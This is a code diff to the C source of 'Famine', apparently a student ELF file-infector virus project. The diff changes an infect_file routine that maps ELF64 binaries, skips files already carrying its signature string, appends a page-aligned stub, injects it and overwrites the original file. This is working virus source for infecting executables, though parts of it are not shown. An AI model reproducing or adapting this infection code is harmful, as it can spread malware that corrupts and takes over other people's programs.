@@ -12,7 +12,10 @@ static void ffree(void *ptr, size_t size) {
 	munmap(ptr, size);
 }
 
-int infect_file(const char *path, const unsigned char *stub, size_t stub_len)
+__attribute__((section(".rodata.signature")))
+static volatile char const signature[] = "Famine version 1.0 (c)oded by cbopp-mvan-wij";
+
+int infect_file(const char *path, const unsigned char *stub, size_t stub_len, size_t placeholders_offset)
 {
 	t_famine	f;
 	struct stat st;
@@ -29,7 +32,7 @@ int infect_file(const char *path, const unsigned char *stub, size_t stub_len)
 	close(fd);
 	if (map == MAP_FAILED)
 		return (LOG("mmap failed\n"), 1);
-	if (!is_valid_elf((Elf64_Ehdr *)map, st.st_size) || memmem(map, st.st_size, FAMINE_SIG, sizeof(FAMINE_SIG) - 1))
+	if (!is_valid_elf((Elf64_Ehdr *)map, st.st_size) || memmem(map, st.st_size, (void*)signature, sizeof(signature) - 1))
 		return (munmap(map, st.st_size), 1);
 
 	f.stub_offset = (st.st_size + PAGE_SIZE - 1) & ~((size_t)PAGE_SIZE - 1);
@@ -42,11 +45,12 @@ int infect_file(const char *path, const unsigned char *stub, size_t stub_len)
 	munmap(map, st.st_size);
 
 	f.ehdr = (Elf64_Ehdr *)f.out;
+	LOG("f.ehdr.e_entry: %zx\n", f.ehdr->e_entry);
 	f.phdr = (Elf64_Phdr *)(f.out + f.ehdr->e_phoff);
 	if (find_segments(&f))
 		return (ffree(f.out, f.out_size), 1);
 
-	inject_stub(&f, stub, stub_len);
+	inject_stub(&f, stub, stub_len, placeholders_offset);
 
 	fd = open(path, O_WRONLY | O_TRUNC, st.st_mode & 07777);
 	if (fd < 0)
